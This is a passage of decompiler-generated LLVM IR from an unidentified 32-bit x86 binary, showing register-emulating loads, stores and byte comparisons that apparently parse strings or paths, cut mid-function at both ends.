  store i32 %v2_80499b7, i32* %edx.global-to-local, align 4
  store i32 %v2_80499b7, i32* %v2_80499b0, align 4
  %v0_80499c0 = load i32, i32* @esp, align 4
  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_8051d50(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00187 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00187, i1* %zf.global-to-local, align 1
  %v2_8049a03189 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03189, align 4
  %v2_8049a05190 = call i32 @function_80524b2(i32* %v1_80484ea)
  store i32 %v2_8049a05190, i32* %eax.global-to-local, align 4
  %v0_8049a0a191 = load i32, i32* @esp, align 4
  %v1_8049a0a192 = add i32 %v0_8049a0a191, 16
  %v1_8049a0d193 = load i32, i32* @ebx, align 4
  %v7_8049a0d194 = icmp ult i32 %v2_8049a05190, %v1_8049a0d193
  %v12_8049a0d195 = icmp eq i32 %v2_8049a05190, %v1_8049a0d193
  store i1 %v12_8049a0d195, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d194, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a196 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a191, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a196, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a196 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8053da0(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_80524b2(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a192, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b2b.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b24.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_8051d00()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8054b35.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8051fc0()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_80528be()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_8052753(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76173 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76173, i32* %ecx.global-to-local, align 4
  %v2_8049b79174 = add i32 %v0_8049b54, 20916
  %v3_8049b79175 = inttoptr i32 %v2_8049b79174 to i32*
  store i32 1, i32* %v3_8049b79175, align 4
  %v0_8049b80176 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80177 = inttoptr i32 %v0_8049b80176 to i8*
  %v2_8049b80178 = load i8, i8* %v1_8049b80177, align 1
  %v3_8049b80179 = zext i8 %v2_8049b80178 to i32
  %v4_8049b80180 = load i32, i32* @edx, align 4
  %v5_8049b80181 = and i32 %v4_8049b80180, -256
  %v6_8049b80182 = or i32 %v5_8049b80181, %v3_8049b80179
  store i32 %v6_8049b80182, i32* %edx.global-to-local, align 4
  %v4_8049b82183 = icmp eq i8 %v2_8049b80178, 0
  store i1 %v4_8049b82183, i1* %zf.global-to-local, align 1
  %v1_8049b84184 = icmp eq i1 %v4_8049b82183, false
  br i1 %v1_8049b84184, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80186 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80178, %dec_label_pc_8049b65 ]
  %v0_8049b80185 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80176, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80186, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp149 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp149, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
